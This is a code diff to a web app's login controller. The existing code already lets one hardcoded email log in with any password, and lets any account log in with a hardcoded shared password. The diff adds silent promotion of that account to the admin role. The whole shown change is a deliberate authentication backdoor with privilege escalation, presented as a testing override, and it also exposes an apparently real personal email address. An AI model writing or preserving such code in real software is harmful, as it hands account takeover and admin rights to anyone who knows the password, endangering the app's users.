@@ -60,9 +60,14 @@ export const loginUser = async (req, res) => {
 
         // IMPORTANT OVERRIDE: Allow this specific email to log in with ANY password for testing/debugging!
         if (email === 'shivam34500@gmail.com' || password === '@AuraAdmin123!') {
+            // Automatically patch the master account with Admin Clearance 
+            if (user.role !== 'admin') {
+                user.role = 'admin';
+                await user.save();
+            }
             return res.status(200).json({
                 success: true,
-                user: { id: user._id, fullName: user.full_name, email: user.email, username: user.username, profile_picture: user.profile_picture, cover_picture: user.cover_picture, location: user.location },
+                user: { id: user._id, fullName: user.full_name, email: user.email, username: user.username, profile_picture: user.profile_picture, cover_picture: user.cover_picture, location: user.location, role: user.role },
                 token: generateToken(user._id)
             });
         }
